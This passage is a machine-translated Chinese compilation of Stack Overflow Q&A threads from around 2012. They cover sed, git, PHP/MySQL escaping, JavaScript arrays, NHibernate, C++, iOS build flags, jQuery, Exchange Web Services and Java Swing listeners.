一些搜索把我带到了这个[页面](https://connect.microsoft.com/VisualStudio/feedback/details/520449/window-pending-changes-does-not-remember-flat-or-hierarchical-view)，在那里指定了一种解决方法，默认情况下使用宏选择 Hierarichal 视图。扩展此方法以解决上述问题并没有实现，因为我相信节点崩溃和取消选择的事件没有被记录下来。

是否有任何解决此问题的方法，例如 VS Power Tool，它提供了一个特殊的功能“全部折叠”，可以折叠解决方案中的所有项目！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T20:56:19.193

您的抱怨并不新鲜，很多人向 MS 抱怨了一年，不幸的是没有真正的解决方案。

展开/折叠问题没有解决方法，**但是**为了改善在处理多个解决方案中的许多更改时的体验，您可以激活“按解决方案过滤”项以仅显示当前打开的解决方案的待处理更改。它减少了项目的数量，希望事情会变得更好。

![在此处输入图像描述](../Images/317035dcaa70335cf71935d8d13da447.png)

正如 Dave Shaw 所说，体验在 VS11 中完全重构，现在好多了。

# regex - sed strip 将混合文本引导到某个字符

> ID：10757501
> 
> 赞同：4
> 
> 时间：2012-05-25T15:47:13.637
> 
> 标签：regex, sed

我有这样的一行：

**14:32:38,723 [一些文字] 错误 - 更多文字**......

我想删除直到（但不包括）第一个“[”的所有内容（这样结果就是以 [some text] ..... 开头的行）

我的阅读

```
's/^.*\d*\s//' 
```

是它应该将所有内容替换为一个数字后跟一个空格，但它似乎在行中的任何地方都应用替换，即贪婪。

我试过了：

```
's/^.*\s\[//g' 
```

但它正在剥离第一个“[”

如何修改任一表达式以执行我需要的操作？非常感谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:51:46.863

我会应用以下 sed 命令

```
s/^[^[]*\[/\[/ 
```

它用`[`单个`[`.

```
$ echo "14:32:38,723 [some text] ERROR - some more" | sed 's/^[^[]*\[/\[/'
[some text] ERROR - some more text 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-05-25T20:26:15.467

这可能对您有用：

```
sed 's/[^[]*//' file 
```

# ruby-on-rails-3 - 使用 Rails 应用程序向 Heroku 推送 git 时出错

> ID：10757502
> 
> 赞同：0
> 
> 时间：2012-05-25T15:47:14.167
> 
> 标签：ruby-on-rails-3, git

当我对 Heroku 上的存储库执行 git push 时，我收到以下错误：

```
'Firing branch removed and pull event' has encountered a problem.

An internal error occurred during: 'Firing branch removed and pull event'.
java.lang.IllegalStateException 
```

我尝试用谷歌搜索它并没有成功。任何人都可以帮忙吗？

的输出`git remote -v`是：

```
heroku git@heroku.com:growing-night-6166.git (fetch)
heroku git@heroku.com:growing-night-6166.git (push) 
origin git@github.com:stuartnelson3/sample_app.git (fetch) 
origin git@github.com:stuartnelson3/sample_app.git (push) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T20:55:06.750

看起来您为存储库指定了两个遥控器；一个在 github 上，一个在 heroku 上。您希望`git push`联系哪一位？

使用标准配置，键入`git push`将推送到名为 的远程`origin`，在您的情况下，它位于 Github。

要将分支显式推`master`送到 Heroku，您可以输入：

```
git push heroku master 
```

存储库中的每个分支配置可能会更改默认行为。假设您正在分支上工作，您可以通过运行以下命令`master`查看裸机将发送内容的位置：`git push`

```
git config --get-regexp 'branch.master.*' 
```

这将显示如下内容：

```
branch.master.remote origin
branch.master.merge refs/heads/master 
```

这将告诉您您`git push`是在尝试联系 Github 还是 Heroku。无论哪种情况，它看起来都是远程端的问题，我会联系相应组织的支持人员。

让我们知道您要推送到哪个遥控器，我们可以尝试做一些额外的诊断。

# php - MySQL没有在'之后保存句子

> ID：10757515
> 
> 赞同：0
> 
> 时间：2012-05-25T15:48:16.240
> 
> 标签：php, mysql, sql

这个让我难住了。当我尝试将某些内容保存到包含撇号 (') 的数据库中时，它会一直保存 sence 直到那时它不会保存。例如;

假设我正在尝试保存：报告详细信息蒂姆库克在 Apple 的变化，无论好坏 »

它节省：报告细节蒂姆库克

它可以很好地保存到数据库中，但只保存 ' 之前的所有内容

我的代码：

```
if(isset($_POST['submit']))
{
global $db, $db_table_prefix;

$origRLTitle = $_POST['RLTitle'];
$origRLURL = $_POST['RLURL'];
$origRLUserID = $_POST['user-id'];

$RLTitle = mysql_real_escape_string($origRLTitle);
$RLURL = mysql_real_escape_string($origRLURL);
$RLUserID = mysql_real_escape_string($origRLUserID);    

if(strlen($RLTitle)>0 && strlen($RLURL)>0 && strlen($RLUserID)>0)
{
mysql_connect($db_host, $db_user, $db_pass) or die(mysql_error());
mysql_select_db("sf") or die(mysql_error());
mysql_query("INSERT  INTO `ReadLater` (Title, URL, User_ID) VALUES ('".$RLTitle."', '".$RLURL."', '".$RLUserID."')");
echo "Saved";
}
} 
```

关于为什么它可能无法正确保存的任何帮助？我已经尝试过 mysql_real_escape_string 但是（如果我使用正确的话）这似乎不起作用。

旁注：保护上述表单免受攻击的最佳方法是什么？

**更新**它也在为 " 做这件事。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:49:59.137

您需要在连接到数据库`mysql_real_escape_string()` *后调用：*

```
if(isset($_POST['submit']))
{
    global $db, $db_table_prefix;

    $origRLTitle = $_POST['RLTitle'];
    $origRLURL = $_POST['RLURL'];
    $origRLUserID = $_POST['user-id'];
    mysql_connect($db_host, $db_user, $db_pass) or die(mysql_error());
    mysql_select_db("sf") or die(mysql_error());

    $RLTitle = mysql_real_escape_string($origRLTitle);
    $RLURL = mysql_real_escape_string($origRLURL);
    $RLUserID = mysql_real_escape_string($origRLUserID);    

    if(strlen($RLTitle)>0 && strlen($RLURL)>0 && strlen($RLUserID)>0)
    {
        mysql_query("INSERT  INTO `ReadLater` (Title, URL, User_ID) VALUES ('".$RLTitle."', '".$RLURL."', '".$RLUserID."')");
        echo "Saved";
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:24:53.163

改变

```
mysql_query("INSERT  INTO `ReadLater` (Title, URL, User_ID) VALUES ('".$RLTitle."', '".$RLURL."', '".$RLUserID."')"); 
```

至

```
$query = "INSERT  INTO `ReadLater` (Title, URL, User_ID) VALUES ('".$RLTitle."', '".$RLURL."', '".$RLUserID."')";
echo $query;
mysql_query($query); 
```

并检查您发送的实际查询，然后很容易发现问题:)

# javascript - 如何防止向 javascript 数组添加重复键

> ID：10757516
> 
> 赞同：45
> 
> 时间：2012-05-25T15:48:22.557
> 
> 标签：javascript, jquery, arrays, duplicates, key-value

我发现很多相关问题的答案都在谈论 for...in 循环和使用 hasOwnProperty 但我所做的一切都无法正常工作。我要做的就是检查数组中是否存在键，如果不存在，则添加它。

我从一个空数组开始，然后在使用 jQuery 清理页面时添加键。

最初，我希望像下面这样简单的东西可以工作：（使用通用名称）

```
if (!array[key])
   array[key] = value; 
```

不去。紧随其后的是：

```
for (var in array) {
   if (!array.hasOwnProperty(var))
      array[key] = value;
} 
```

也试过：

```
if (array.hasOwnProperty(key) == false)
   array[key] = value; 
```

这些都没有奏效。要么什么都没有推送到数组中，要么我尝试的只是简单地声明`array[key] = value`为什么这么简单的事情这么难做。有什么想法可以完成这项工作吗？

* * *

## 回答 #1

> 赞同：45
> 
> 时间：2012-05-25T15:51:45.783

一般来说，这最好用一个对象来完成，因为 JavaScript 并没有真正的关联数组：

```
var foo = { bar: 0 }; 
```

然后用于`in`检查密钥：

```
if ( !( 'bar' in foo ) ) {
    foo['bar'] = 42;
} 
```

正如在下面的评论中正确指出的那样，此方法*仅*在您的键是字符串或可以表示为字符串的项目（例如数字）时才有用。

* * *

## 回答 #2

> 赞同：38
> 
> 时间：2012-05-25T15:52:03.413

```
var a = [1,2,3], b = [4,1,5,2];

b.forEach(function(value){
  if (a.indexOf(value)==-1) a.push(value);
});

console.log(a);
// [1, 2, 3, 4, 5] 
```

*有关更多详细信息，请阅读[`Array.indexOf`](https://developer.mozilla.org/en/JavaScript/Reference/Global_Objects/Array/indexOf)。*

如果您想依赖 jQuery，请改用[`jQuery.inArray`](http://api.jquery.com/jQuery.inArray/)：

```
$.each(b,function(value){
  if ($.inArray(value,a)==-1) a.push(value);
}); 
```

**但是，如果您的所有值都可以简单且唯一地表示为 strings**，那么您应该使用 Object 而不是 Array，以潜在地*大幅*提高速度（如@JonathanSampson 的回答中所述）。

* * *

## 回答 #3

> 赞同：22
> 
> 时间：2019-03-05T09:36:51.163

在 ES6 中使用 Sets 提供了更好的替代方案。因此，如果您需要一个不应该添加重复项的数组，建议您使用 Sets，而不是声明 Arrays。

```
var array = new Set();
array.add(1);
array.add(2);
array.add(3);

console.log(array);
// Prints: Set(3) {1, 2, 3}

array.add(2); // does not add any new element

console.log(array);
// Still Prints: Set(3) {1, 2, 3} 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2021-06-09T21:39:22.603

如果您已经在使用传播...

```
let colors = ['red', 'orange', 'yellow'];
let moreColors = ['orange', 'green'];

let mergedColors = [...colors, ...moreColors]; 
```

并希望避免重复...

```
let mergedColors = [...colors, ...moreColors.filter(c => !colors.includes(c)) ]; 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2017-01-11T12:57:47.237

你可以试试这个：

```
var names = ["Mike","Matt","Nancy","Adam","Jenny","Nancy","Carl"];
var uniqueNames = [];
$.each(names, function(i, el){
if($.inArray(el, uniqueNames) === -1) uniqueNames.push(el);
}); 
```

[在 JavaScript 数组中查找重复值的最简单方法](https://stackoverflow.com/questions/840781/easiest-way-to-find-duplicate-values-in-a-javascript-array)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-05-25T15:52:26.593

逻辑是错误的。考虑一下：

```
x = ["a","b","c"]
x[0]     // "a"
x["0"]   // "a"
0 in x   // true
"0" in x // true
x.hasOwnProperty(0)   // true
x.hasOwnProperty("0") // true 
```

没有理由循环检查*键*（或数组的*索引*）是否存在。现在，*价值观*是一个不同的故事......

快乐编码

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2016-01-04T17:11:26.643

```
function check (list){
    var foundRepeatingValue = false;
    var newList = [];
    for(i=0;i<list.length;i++){
        var thisValue = list[i];
        if(i>0){
            if(newList.indexOf(thisValue)>-1){
                foundRepeatingValue = true;
                console.log("getting repeated");
                return true;
            }
       } newList.push(thisValue);
    } return false;
} 
```

```
var list1 = ["dse","dfg","dse"];
check(list1); 
```

输出：

```
getting repeated
true 
```

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2021-11-01T17:18:10.590

```
let x = "farceus";
let y = "character";

const commonCharacters = function (string1, string2) {
  let duplicateCharacter = "";
  for (let i = 0; i < string1.length; i += 1) {
    if (duplicateCharacter.indexOf(string1[i]) === -1) {
      if (string2.indexOf(string1[i]) !== -1) {
        duplicateCharacter += string1[i];
      }
    }
  }
  return [...duplicateCharacter];
};

console.log(commonCharacters(x, y));
```

# c# - 派生类中的对象引用数据库中的基类，而不是派生类

> ID：10757520
> 
> 赞同：1
> 
> 时间：2012-05-25T15:48:35.800
> 
> 标签：c#, nhibernate, inheritance, mapping

（当我说一条记录“有”另一条记录时，我的意思是另一条记录引用了第一条记录）。

我有以下数据库关系：

**表**

> BaseAnswer -> MultipleChoiceAnswer -> MultipleChoiceAnswerCulture

BaseAnswer 记录可以有一个 MultipleChoiceAnswer 记录。对于每个“MultipleChoiceAnswer”，都有几个“Culture”记录：

**记录**

> 英文标题
> 
> 法语标题

MultipleChoiceAnswer 记录有一个引用 BaseAnswer 主键的列，同样，MultipleChoiceAnswerCulture 中的记录有一个*应该*引用 MultipleChoiceAnswer 主键的列。但是，我的问题是插入到 MultipleChoiceAnswerCulture 的记录是指 BaseAnswer 的主键（根父级，而不是直接父级）。这是我的代码：

```
public class MultipleChoiceAnswerMap : SubclassMap<MultipleChoiceAnswer>
{
    public MultipleChoiceAnswerMap() 
    {            
        Table("MultipleChoiceAnswer");
        KeyColumn("BaseAnswerID");
        Map(x => x.Score);

        HasMany(x => x.Resources)
            .CollectionType<ResourceMapSetUserType<MultipleChoiceAnswerCulture>>()
            .KeyColumn("MultipleChoiceAnswerID")
            .Cascade.AllDeleteOrphan()
            .Access.CamelCaseField(Prefix.Underscore)
    } 
```

}

我们的一个项目中有另一个与此类似的示例，即使我正在解决这个问题，这仍然会在 MultipleChoiceAnswerCulture 表中插入 BaseAnswer 的主键作为参考，而不是 MultipleChoiceAnswer 的主键。

任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-28T16:28:12.980

好吧，我们已经调查过了，显然我正在处理的代码很可能遇到了同样的问题。毕竟，我们可能会继续让 MultipleChoiceAnswerCulture 中的外键成为对根父级的引用。如果有人确实知道如何解决这个问题，如果您将其发布在这里，我将不胜感激。

谢谢。

# c# - 如何修改复选框列表的外观使其看起来像按钮

> ID：10757523
> 
> 赞同：1
> 
> 时间：2012-05-25T15:48:39.237
> 
> 标签：c#, asp.net

我认为这很容易，但我无法找到如何做到这一点。我找到了如何使用复选框（[http://msdn.microsoft.com/en-us/library/system.windows.forms.checkbox.appearance.aspx）](http://msdn.microsoft.com/en-us/library/system.windows.forms.checkbox.appearance.aspx)来做到这一点。

但是，checkboxlist 控件怎么能做到这一点呢？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-03T15:12:39.477

正如史蒂夫 B 建议的那样，一个不错的方法是使用 jQuery。我在 asp:Repeater 控件中放置了一个复选框，并修改了该复选框的外观，使其看起来像一个按钮。这是代码：

```
<asp:Repeater ID="RepeaterVocabularyWords" runat="server" OnItemCommand="RepeaterVocabularyWords_ItemCommand">
    <ItemTemplate>
        <span class="storeCheck">
            <asp:CheckBox ID="CheckBoxVocabularyWord" Font-Size="0px" runat="server" Text="<%# Container.DataItem %>"
                ClientIDMode="Static" CssClass="{labelOn: '<%# Container.DataItem %>', labelOff: '<%# Container.DataItem %>', easing: 'easeOutBounce', duration: 500}" />
        </span>
    </ItemTemplate>
</asp:Repeater> 
```

在后面的代码中：

```
String [] wordsForButtons = new[] { "text1", "text2", "text3" };               
RepeaterVocabularyWords.DataSource = wordsForButtons;
RepeaterVocabularyWords.DataBind(); 
```

我希望它对某人有用！

卡洛斯

# c++ - 我如何要求用户输入一个文件并让 c++ 打开这个文件？

> ID：10757528
> 
> 赞同：0
> 
> 时间：2012-05-25T15:49:00.373
> 
> 标签：c++, file

是否可以在简单的 C++ 中要求用户输入路径并操作同一个文件？有没有人知道一个网站来了解更多关于这方面的信息？这一次谷歌可没那么容易。

```
#include <iostream>
#include <fstream>

int main()
{
    using namespace std;

    char * b = 0;

    cin >> b;

    cout << b;

    const char * c = b;

    ofstream myfile;
    myfile.open (c);
    myfile << "Writing this to a file.\n";
    myfile.close();

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T15:51:50.317

而不是`char*`使用`std::string`：

```
#include <string>

std::string b; 
```

正如代码一样，正在尝试通过 NULL 指针进行写入。

如果不是 C++11，那么您需要使用`b.c_str()`传递给`myfile.open()`：

```
myfile.open(b.c_str()); // Or ofstream myfile(b.c_str());
if (my_file.is_open())
{
    myfile << "Writing this to a file.\n";
    myfile.close();
} 
```

# git - GIT 推送到远程服务器排除文件夹/文件

> ID：10757530
> 
> 赞同：1
> 
> 时间：2012-05-25T15:49:07.633
> 
> 标签：git, git-push, git-commit

使用“git push remote_name”时有没有办法排除某些目录。

例如，我在存储库中有这个文件夹/文件结构：

```
/applications/
/libs/
/themes/
/misc/
/index.php
/robots.txt
/sitemap.xml 
```

当我在本地工作时，我提交对任何文件/文件夹所做的所有更改，但是当我需要将所有内容“推送”到远程服务器存储库时，我想排除某些文件和文件夹，例如“/themes/”文件夹和 robots.txt 文件

**摘要**：我在本地“提交”所有内容，但在需要执行“git push”的那一刻，我希望能够排除文件夹和文件。

我希望这是有道理的。

谢谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-25T15:52:30.073

不，你不能用 Git 做到这一点。在 Git 中，每个提交都被视为一个原子实体；您不能选择要推送的特定提交的部分。

如果你想分解你的存储库，这样有些东西只在本地跟踪，有些推送到服务器，你应该为每个部分使用单独的存储库，可能使用 Git 子模块链接在一起。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:52:23.883

您应该保留一个单独的分支，该分支与您希望在远程存储库中拥有的内容相匹配。例如，在 master 上工作，切换到 my-public-branch，cherry-pick/merge/rebase off master，推送到远程，切换回 master 以进行更多工作。

# objective-c - 了解应用程序是否在测试环境中运行

> ID：10757532
> 
> 赞同：1
> 
> 时间：2012-05-25T15:49:08.693
> 
> 标签：objective-c, ios

有没有办法知道程序是否在开发环境中运行？我正在使用 Flurry Analytics 并希望向它传递一个不同的应用程序 ID，因此数据不会在开发过程中被我的测试弄脏。

我想要的是这样的：

```
Boolean isDevEnv = .... (is this a test in the simulator or device,
                         OR is it a real user that downloaded the 
                         app through the app store?)
if (isDevEnv)
  [FlurryAnalytics startSession:@"firstAppId"];
else
  [FlurryAnalytics startSession:@"secondAppId"]; 
```

需要明确的是，[这](https://stackoverflow.com/questions/5775420/programmatically-detect-if-app-is-being-run-on-device-or-simulator)不是我想要的，因为我使用真实设备和模拟器进行测试。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T15:58:02.270

在构建设置中，您必须根据构建环境设置标志。

然后，使用#ifdef 和#define 设置appid。

```
#ifdef DEBUG
#    define APPID ...    
#else
#    define APPID ...
#endif 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T15:51:43.507

在您的构建设置中，为 App Store 发布版本定义一个新标志。然后使用`#ifdef`在编译时确定使用哪个appid。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T15:55:32.053

如果您不想使用`DEBUG`标志和`DEBUG`环境，请创建一个新的构建配置（重复发布配置）并在构建设置预处理器宏中添加一个 FlurryAnalytics 标志。在您的代码检查`if(FlurryAnalytics)`中。在 XCode 中创建一个使用此新版本构建配置创建 ipa 的新方案。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T16:21:33.417

好吧，这似乎是 Xode 默认完成的，在项目的构建设置中，在`Apple LLVM compiler 3.1 - Preprocessing`（这是在 Xcode 4.3.2 中，供将来参考）下，一个名为的设置`DEBUG`填充了 value `1`。

所以，我真的不需要做任何事情，只是在代码中（在我的例子中是 AppDelegate 的`didFinishLaunchingWithOptions`方法）：

```
[FlurryAnalytics startSession:DEBUG ? @"firstAppId" : @"secondAppId"]; 
```

# jquery - 将元素拖到可放置列表中的适当位置

> ID：10757533
> 
> 赞同：2
> 
> 时间：2012-05-25T15:49:09.957
> 
> 标签：jquery, list, droppable

有没有办法将元素拖到可排序（可放置）列表上？并将它们添加到列表中的正确位置吗？

起初我以为我可以使用列表下的可放置 div 的函数来执行此操作，但我的列表会比屏幕长。这意味着用户将不得不滚动，此时，我认为尝试获取鼠标位置将毫无意义。

这是我正在尝试做的事情：http: [//jsfiddle.net/tvance929/E7DPk/2/](http://jsfiddle.net/tvance929/E7DPk/2/)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-05-28T11:43:31.563

只需使用`connectToSortable`并设置`helper`to `clone`，例如：

```
$("#theList").sortable({
    revert: true
});
$( "#dragMe" ).draggable({
    connectToSortable: "#theList",
    helper: "clone",
    revert: "invalid"
}); 
```

见这里：[小提琴](http://jsfiddle.net/E7DPk/6/)

# exchange-server - 以编程方式创建交流会议

> ID：10757537
> 
> 赞同：5
> 
> 时间：2012-05-25T15:49:19.917
> 
> 标签：exchange-server, exchangewebservices, exchange-server-2010

是否可以在其他人的 Exchange 2010 帐户上创建会议或约会，而无需他们接受会议？理想情况下，我们希望有一个代表帐户或类似的策略，将约会/会议放在人们的日历上。我们想绕过正常的请求/接受模型，并将这些会议强制纳入日历。

我查看了 Exchange 2010 文档中的 CreateItem()，但不清楚该方法执行后会发生什么。用户是否收到正常的邀请？我们不希望那样。我们想要一个模型，我们的系统可以完全控制用户的日历，而不会收到传统的会议邀请，并且可以自动接受。我也不想使用 VBA hacks 或插件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-29T13:08:17.827

我认为在使用情况下是可能的`ApplicationImpersonation`（使用`ImpersonatedUserId`）。您必须首先[配置](http://msdn.microsoft.com/en-us/library/bb204095.aspx)Exchange，这一点很重要。然后您可以设置`NetworkCredential` 使用`ImpersonatedUserId`直接访问目标日历。有关更多信息和代码示例，请参见[此处](http://msdn.microsoft.com/en-us/library/gg194012%28v=exchg.140%29.aspx)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-28T16:11:17.930

我要做的是获取 MFCMapi (mfcmapi.codeplex.com) 的副本，然后以传统方式创建会议请求并将其发送到几个邮箱。在一对夫妇中接受它，在一对夫妇中标记暂定，等等。

查看在受邀者邮箱中创建的结果日历项目。我希望您应该能够创建约会，然后设置必要的 MAPI 属性以使其显示为已接受。您可以使用 EWS 设置任意属性，只是需要进行一些挖掘才能确定要设置哪些属性。MFC Mapi 是一个很好的工具。

在组织者方面，您需要进行一些调整，以便看起来每个人都接受了。

# javascript - 联系表单和 IE8 问题 - 似乎无法停止表单提交

> ID：10757543
> 
> 赞同：1
> 
> 时间：2012-05-25T15:49:44.310
> 
> 标签：javascript, jquery, forms, return-value, preventdefault

我有一个使用`.ajax()`jQuery 中的方法提交的联系表单，以便在不刷新页面的情况下提交表单。它适用于除 IE 之外的所有浏览器，它非常适合并坚持刷新页面。

这是我的代码：

```
function appointmentform() {    
    $("#appointment-form").on("submit", function(e) {

        // serialize all input data
        var dataString = $(this).serialize();
        console.log(dataString);

        // if there are no inputs with errors
        if ($("input.required.error").length < 1) {

            // ajax call to mail.php script
            $.ajax({
                type: "POST",
                url: "http://www.thesalonleamingtonspa.com/mail",
                data: dataString,
                success: function() {
                    // success notice
                }
            });

        }

        // cancel form submit
        if (e.preventDefault) { 
            e.preventDefault(); 
        } else { 
            e.returnValue = false; 
        }
    });
} 
```

我意识到这`e.preventDefault()`对 IE 没有任何意义，但我认为`e.returnValue = false`是等价的。有人知道为什么它不适合我吗？

编辑：这只是 IE8 问题的孩子。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-05-25T17:42:33.517

**真正的罪魁祸首是 IE8 &`console.log`**

IE8 不支持`console`直接写入，所以脚本一`console`遇到函数就停止运行。在我的代码中，`preventDefault`在该`console`部分之后，所以它没有运行。

**解决方案：**在 IE8 中保持开发人员工具打开将允许您写入`console`

我正在回答我自己的问题，因为其他答案都不是 100% 正确的，尽管它们很有帮助。任何将来查看我的问题的人都可能会从听到我现在概述的真正原因中受益。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T15:51:44.833

返回`false`应取消表单提交

代替

```
 if (e.preventDefault) { 
        e.preventDefault(); 
    } else { 
        e.returnValue = false; 
    } 
```

采用

```
return false; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T16:28:43.917

怎么样：而不是使用提交，只需使用一个按钮：

```
// use this ~ buttons don't do anything unless explicitly told to
<input type="button">

// not this ~ the default behavior is to submit ~ which you don't want
<input type="submit"> 
```

您只需要监听按钮的点击，然后触发该功能。

我已经好几年没用过提交按钮了……从字面上看……只是为了避免这个问题。

我通常监听“提交”事件的方式是点击。以我的经验，即使是 IE 也可以处理点击事件。

```
function doAjaxStuff {
    // do form validation
    // do ajax stuff
}
myButton.click(doAjaxStuff); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-05-25T16:50:38.050

> 我意识到 e.preventDefault() 对 IE 没有任何意义

仅当您不使用 jQuery 时，这才是正确的。jQuery 使这个跨浏览器。

猜猜：你使用 jQuery < 1.4 吗？

> JavaScript 提交事件不会在 Internet Explorer 中冒泡。但是，从 jQuery 1.4 开始，依赖事件委托和 submit 事件的脚本将在浏览器中始终如一地工作，这已经规范了事件的行为。

-- [http://api.jquery.com/submit/](http://api.jquery.com/submit/)

# java - Java 数组：用常量识别向量的元素

> ID：10757547
> 
> 赞同：0
> 
> 时间：2012-05-25T15:49:54.443
> 
> 标签：java, arrays, enums

我有一个字符串数组 ( `String[]`)，其中包含几个表示 XPath 查询的字符串对象。这些查询是在设计时预先确定的。这个数组被传递给一个执行查询的对象，然后返回一个`Map<String, ArrayList<String>>`带有结果的对象。

地图是这样制作的：

```
{Query that originated the result, Results vector} 
```

由于我必须获取这些结果，然后对它们执行一些工作，因此我需要了解各个查询。例如：

```
ArrayList<String> firstQueryResults = xpathResults.getObject(modelQueries[0]);
... logic pertaining only to the first query results ... 
```

通过整数（在第一个查询的情况下，“0”）检索结果对我来说似乎并不好，所以我想知道是否有可能通过类似枚举的常量来识别它们，以便更清楚：

```
... = xpathResults.getObject(QueryDictionary.MODEL_PACKAGE);
... = xpathResults.getObject(QueryDictionary.COMPONENT_PACKAGE);
OR
... = xpathResults.getObject(ModelQueries.PACKAGE);
... = xpathResults.getObject(ComponentQueries.PACKAGE); 
```

我曾想过使用地图（`Map<String, String>`例如，在 中`Map {ID, Query}`），但我仍然需要通过硬编码字符串（例如“Package”）引用查询。我也想过使用`enums`，但我有几个查询集（模型、组件、...），我还需要以表单的`String[]`形式获取所有查询，以便将它们传递给执行查询的对象。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:00:07.230

您可以使用标记界面：

```
public interface QueryType {
} 
```

然后你的枚举可以实现这个接口：

```
public enum ModelQueries implements QueryType {
   ...
}

public enum ComponentQueries implements QueryType {
   ...
} 
```

等等。

然后您的`getObject`方法可以接受类型的参数`QueryType`。你在找这样的东西吗？如果我没有正确理解您的问题，请告诉我。

# java - java 文档监听器

> ID：10757555
> 
> 赞同：5
> 
> 时间：2012-05-25T15:50:15.173
> 
> 标签：java, swing, jtextfield, documentlistener

我试图在更改 JTextField 的文本后调用方法。

```
textField.getDocument().addDocumentListener(new DocumentListener()
        {

            public void changedUpdate(DocumentEvent arg0) 
            {
                System.out.println("IT WORKS");
                panel.setPrice(panel.countTotalPrice(TabPanel.this));
            }
            public void insertUpdate(DocumentEvent arg0) 
            {

            }

            public void removeUpdate(DocumentEvent arg0) 
            {

            }
        }); 
```

当我在另一个 ActionListener 上调用此方法时，它工作正常。但是当我更改文本字段中的文本时，什么也没有发生。甚至打印。有什么建议么？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-25T16:17:04.973

问题解决了。仅当其他属性（字体、大小，但不是文本）发生更改时才调用 changedUpdated 方法。要在每次更改文本后调用方法，我应该将调用放入 insertUpdate 和 removeUpdate 方法。这边走：

```
textField.getDocument().addDocumentListener(new DocumentListener()
        {

            public void changedUpdate(DocumentEvent arg0) 
            {

            }
            public void insertUpdate(DocumentEvent arg0) 
            {
                System.out.println("IT WORKS");
                panel.setPrice(panel.countTotalPrice(TabPanel.this));
            }

            public void removeUpdate(DocumentEvent arg0) 
            {
                System.out.println("IT WORKS");
                panel.setPrice(panel.countTotalPrice(TabPanel.this));
            }
        }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:08:54.380

尝试使用`ActionListener`：

```
textField.addActionListener(this);

...
public void actionPerformed(ActionEvent evt) {
   String s = textField.getText();
   System.out.println(s);
   ...
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-23T19:58:35.153

我发现这个解决方案最快：

```
new JTextPane().addActionListener(new Key()); 
```

* * *

```
class Key extends KeyAdapter{
private static final Object lock = new Object();
        private static int keydiff=0;
        public void keyReleased(KeyEvent e) {
            switch(e.getKeyCode())
            {
                //IGNORE FUNCTIONAL KEYS
                case 38 :
                case 39 :
                case 37 :
                case 40 :
                case 17 :
                case 157 :
                case 10 : break;
                default : keydiff++;
            }

            if(keydiff!=0)
            {
              synchronized(lock){
                  keydiff=0;
                  //EVENT FIRED HERE
              }             
            }
        }
    } 
```

它比：

```
.getDocument().addDocumentListener( .... changeUpdate()) 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-04-18T22:11:29.460

这是您问题的另一种解决方案。不必在每个方法下重复相同的代码，您可以创建一个方法并为 changedUpdate、insertUpdate、removeUpdate 调用该方法。

```
textField.getDocument().addDocumentListener(new DocumentListener()
    {

        public void changedUpdate(DocumentEvent arg0) 
        {
            printMyLines();
        }
        public void insertUpdate(DocumentEvent arg0) 
        {
            printMyLines();
        }

        public void removeUpdate(DocumentEvent arg0) 
        {
            printMyLines();
        }

        private void printMyLines()
        {
            System.out.println("IT WORKS");
            panel.setPrice(panel.countTotalPrice(TabPanel.this));
        }
    }); 
```

# java - GWT Cloner 需要深度克隆内存中的对象

> ID：10757559
> 
> 赞同：1
> 
> 时间：2012-05-25T15:50:27.690
> 
> 标签：java, gwt, clone

我需要在 GWT 中深度克隆一个对象。在服务器端有一些实用程序，例如：[http](http://code.google.com/p/cloning/) ://code.google.com/p/cloning/ ，它使用反射，因此在 GWT 中不可用。

我在想也许解决方案是 ObjectStreamWriter。

你知道自动克隆更好的解决方案吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-18T12:03:48.630

没有办法在前端使用 GWT 序列化克隆对象，因为这种序列化不是对称的。

如果您注意 GWT RPC 请求和响应，您会看到请求中的分隔符是“|” 在响应中，分隔符是“，”。显然这不是唯一的区别，更换分隔符也无济于事。

这意味着在 javascript 中序列化的对象只会在服务器中反序列化，在服务器中序列化的对象只会在 javascript 中反序列化。

# html - 填充跨度的中间线

> ID：10757561
> 
> 赞同：0
> 
> 时间：2012-05-25T15:50:30.467
> 
> 标签：html, css

[这是此处](https://stackoverflow.com/questions/9327766/how-to-remove-background-color-between-lines-on-h1-tag/9327807#comment13943906_9327807)的问答的后续内容。

